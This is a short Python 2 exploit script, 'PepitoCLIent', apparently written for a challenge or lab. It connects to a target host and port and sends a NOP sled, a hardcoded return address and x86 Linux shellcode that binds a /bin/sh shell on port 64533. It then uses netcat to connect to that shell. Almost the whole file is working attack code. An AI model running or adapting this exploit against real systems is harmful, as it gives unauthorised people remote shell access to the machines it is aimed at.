#!/usr/bin/python

###################################################
# PepitoCLIent v0.1a -- Zerk's Inside		  #
# Edited by PEPITO DE LU			  #
###################################################

import time
import socket
import sys
import os

def show_code():
  print "sock = socket(PF_INET, SOCK_STREAM, 0);"

def main():
  if (len(sys.argv) < 3):
    print("Usage : " + sys.argv[0]  + " <host> <port>")
  else:
    sys.stdout.write("[+] \033[33mConnection ...\033[00m              ")
    try:
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      sock.connect((sys.argv[1], int(sys.argv[2])))
      print "[\033[32mOK\033[0m]"
      sys.stdout.write("[+] \033[33mSend malicious code ...     \033[00m")
      if len(sys.argv) == 4 and sys.argv[3] == "code":
	show_code()
      code = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x66\x6a\x01\x5b\x58\x99\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x52\x66\x68\xfc\x15\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x6a\x66\x58\x43\x43\x6a\x05\x56\xcd\x80\x6a\x66\x58\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x6a\x3f\x58\x31\xc9\xcd\x80\x6a\x3f\x58\x41\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x50\xb0\x0b\x59\xcd\x80"
      addr = "\xd0\xaa\x04\x08"
      sock.send("1 " + str(len(addr) + len(code)) + addr + code)
      print "[\033[32mOK\033[0m]"
      sys.stdout.write("[+] \033[33mConnection to the N3WB13... \033[00m[\033[32mOK\033[0m]\n")
      sys.stdout.write("[+] \033[33mExecuting \033[01mnc " + sys.argv[1] + " 64533\033[00m\n")
      os.system("nc " + sys.argv[1] + " 64533  || echo \"[\033[31mFailure\033[0m]\"")
    except Exception as e:
      print "[\033[31mFailure\033[0m]"

if __name__ == "__main__":
    main()
